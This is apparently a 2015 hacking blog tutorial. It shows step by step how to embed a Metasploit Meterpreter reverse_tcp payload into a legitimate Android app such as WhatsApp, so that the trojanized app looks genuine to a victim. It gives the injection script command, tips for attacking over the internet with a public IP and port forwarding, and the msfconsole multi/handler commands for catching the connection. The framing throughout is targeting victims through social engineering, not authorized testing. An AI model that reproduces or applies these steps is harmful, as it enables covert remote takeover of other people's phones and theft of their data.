---
date: 'Sat Dec 12 2015 02:30:19 GMT+0530 (India Standard Time)'
title: Embed a Metasploit Payload in an Original .apk File | Part 1 — The Easy Way
tags:
  - android
  - hacking
  - metasploit
  - kali-linux
---

Hi Fellas! I’m sure most of you, or at least those who have set a foot in the kingdom of hacking, have heard of Metasploit. Don’t be disappointed if you haven’t, because you’re in the right track. 

From Wikipedia,

> The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. Its best-known sub-project is the open source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research.


In a more informal language, it’s a tool which we can use to perform various kinds of hacks against a machine. The flagship payload which comes with the Metasploit Framework is the _Meterpreter_, which also has an Android version that comes as an .apk file. In case you are wondering what a payload is, it’s a program we can install on a victim’s system to compromise it. Normally we have to install the Meterpreter payload in the victims phone by any means—usually involving Social Engineering—and when the victim runs the application, we would get a direct connection to that phone remotely and we can use it to wreak havoc on it.

But since the payload app doesn’t look very legit, takes up only a few kBs, and doesn’t show anything when clicked on, the victim will probably uninstall it right away, or worse, wouldn’t install it at all. So we have to solve that problem.

Here’s where this tutorial comes in. I’m gonna show you how to take any .apk file, be it WhatsApp or Amazon or SnapChat, and embed the Meterpreter payload in that apk. To the victim it will look and behave exactly as the original app, so he will use it regularly without any doubt, letting you do anything you want to his phone.


### Pre-requisites

Just to be clear,  In this tutorial the operating system used is Kali Linux, which is a de facto standard OS for Penetration Testing—read, hacking. You should also install the latest version of _ApkTool_ and some libraries for the scripts to work properly.

To install the required libraries, enter this command at the console —
```console
$ sudo apt-get install lib32stdc++6 lib32ncurses5 lib32z1
```

And to get the latest version of _ApkTool_, head over to [this site](http://ibotpeaches.github.io/Apktool/install/) and follow the installation instructions.


### Step 1

First of all grab the original apk from any of the numerous websites available. Just do a google search “app_name apk download” and Google will come up with a lot of results. Save that apk in any folder, in this tutorial I will use the Root folder and a `WhatApp.apk` as example.

### Step 2

Download the Ruby script from [this link](https://github.com/SkullTech/apk-payload-injector) and save it in the same folder as that of the original apk.

### Step 3

Open a terminal, and type the following command:
```console
$ ruby apk-embed-payload.rb WhatsApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4895
```

In this example I’ve used 192.168.0.104 as the Local IP address, i.e. your IP address and 4895 as the port on your Computer through which the Meterpreter payload will connect back to you. Make sure to change it to the appropriate values, especially the IP, the `LPORT` can be set to any reasonable port no.

_NOTE_. If you are going to conduct this attack over the internet, be sure to put your public IP, not your local IP, in the `LHOST` option. You also may need to forward the port you’re using for this attack to work properly.

Once you run the command, if you are lucky, the script will do everything by itself and complete the whole process. But more than often it cannot determine to which Activity of the app it should bind the payload to, so it asks you to select it. In that case, leave the terminal open with the script at the prompt, and browse to `/root/original`.

Then open the `AndroidManifest.xml` file using any text editor you like and look for an `<activity>` tag which contains both the texts `.MAIN` and `.LAUNCHER`. When you find that tag, look for the `android:name` attribute of that tag and from there, note the name of that Activity.

At the prompt of the Ruby script, enter the number corresponding to the Activity name you had noted previously and press Enter.

This is the hardest step of all, so I’m posting some screenshots to make your life easier.

![Screenshot from 2015-12-12 01-44-01](/images/posts/metasploit-apk-easily-screenshot-from-2015-12-12-01-44-01.png)
![Screenshot from 2015-12-12 01-43-27](/images/posts/metasploit-apk-easily-screenshot-from-2015-12-12-01-43-27.png)


### PROFIT?!

If you did everything correctly, you should now get an .apk file in your root directory with the name `backdoored_WhatsApp.apk`. It will install and run just like the original app.

As for the listener, you should use `multi/handler` and set the corresponding options accordingly. Just run the following commands —

```console
msfconsole
use multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.0.104
set LPORT 4895
exploit
```

Now wait for the victim to run the app, when he does it, you will get a Meterpreter prompt in the terminal!

![Screenshot from 2015-12-18 14:32:55](/images/posts/metasploit-apk-easily-screenshot-from-2015-12-18-143255.png)


### Note

You must have noticed I haven’t explained anything, rather asked you to blindly follow. As none of us wants to be a script-kiddie, we will learn how to do this manually in the next article. To be honest, I didn’t know how to successfully implement this until I found this script. After I saw that this script does what it promises, I learned the process by reverse-engineering it. Let us set that story apart for another article.

If you face any problem, don’t forget to mention it in the comments. I’ll try to help you in any way I can.

### Credits

I found the script from the comments section of a thread in _NullByte_, so thanks to the guy who shared it, I’m sorry I don’t remember which thread it was or who the guy was. And credit of making this script goes to _timwr_ and _Jack64_.

